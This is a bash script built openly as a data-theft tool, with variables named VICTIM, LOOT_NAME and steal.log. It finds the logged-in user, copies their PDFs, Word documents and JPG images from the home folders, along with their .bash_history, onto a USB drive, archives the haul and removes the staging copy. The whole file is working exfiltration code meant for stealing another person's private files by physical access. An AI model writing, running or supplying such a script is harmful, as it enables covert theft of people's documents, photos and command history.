#!/bin/bash

# ======= CONFIG =======
USB_LABEL="new"
LOOT_NAME="loot_$(date +%F_%H-%M-%S)"

# Detect the real active user
VICTIM=$(logname 2>/dev/null || who | awk '/tty/ {print $1; exit}')
HOME_DIR="/home/$VICTIM"

# Detect USB mount path
MOUNT_PATH="/media/$VICTIM/$USB_LABEL"
DEST="$MOUNT_PATH/$LOOT_NAME"
LOG="$MOUNT_PATH/steal.log"
ARCHIVE="$MOUNT_PATH/${LOOT_NAME}.tar.gz"

# ======= CHECKS =======
if [ ! -d "$MOUNT_PATH" ]; then
    echo "[!] USB drive with label '$USB_LABEL' not mounted." >&2
    exit 1
fi

mkdir -p "$DEST"

# ======= COPY FUNCTION =======
copy_files() {
    SRC="$1"
    LABEL="$2"
    TARGET="$DEST/$LABEL"
    mkdir -p "$TARGET"
    find "$SRC" -type f \( -iname "*.pdf" -o -iname "*.docx" -o -iname "*.jpg" \) -exec cp {} "$TARGET" \; 2>/dev/null
    echo "[+] $LABEL copied from $SRC at $(date)" >> "$LOG"
}

# ======= START =======
echo "[*] Started copying for user $VICTIM at $(date)" >> "$LOG"

copy_files "$HOME_DIR/Documents" "documents"
copy_files "$HOME_DIR/Downloads" "downloads"
copy_files "$HOME_DIR/Desktop" "desktop"
copy_files "$HOME_DIR/Pictures" "pictures"

cp "$HOME_DIR/.bash_history" "$DEST/bash_history.txt" 2>/dev/null && \
    echo "[+] .bash_history copied at $(date)" >> "$LOG"

# ======= COMPRESS & CLEANUP =======
tar czf "$ARCHIVE" -C "$MOUNT_PATH" "$(basename "$DEST")" 2>/dev/null
rm -rf "$DEST"

echo "[✔] Finished copying. Archive: $ARCHIVE" >> "$LOG"

